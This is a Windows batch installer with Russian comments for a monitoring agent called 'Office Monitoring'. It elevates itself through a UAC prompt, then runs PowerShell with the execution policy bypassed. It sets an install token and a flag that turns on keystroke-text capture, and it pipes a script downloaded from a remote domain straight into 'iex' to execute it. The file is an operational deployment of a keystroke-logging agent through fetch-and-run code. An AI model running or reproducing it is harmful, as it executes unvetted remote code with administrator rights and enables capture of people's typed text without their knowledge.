@echo off
title Office Monitoring - Установка
color 0A

:: ═══════════════════════════════════════════════
:: Автоматическая установка Office Monitoring
:: Двойной клик → "Да" на UAC → готово
:: ═══════════════════════════════════════════════

:: Шаг 1: проверяем админ-права. Если нет — перезапускаем с UAC.
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [*] Запрашиваю права администратора...
    powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

echo ════════════════════════════════════════
echo   Office Monitoring - установка агента
echo ════════════════════════════════════════
echo.

:: Шаг 2: запускаем PowerShell installer с нужными параметрами
powershell -ExecutionPolicy Bypass -NoProfile -Command ^
  "$env:OM_INSTALL_CODE='z6LVJFW04Y4P0ILGOH-99dMJEq6G0ZVH'; $env:OM_ENABLE_KEYSTROKE_TEXT='1'; irm https://office.lkdzrkk.pro/install.ps1 -UseBasicParsing | iex"

echo.
echo ════════════════════════════════════════
echo   Установка завершена. Окно закроется
echo   автоматически через 10 секунд.
echo ════════════════════════════════════════
timeout /t 10 /nobreak >nul
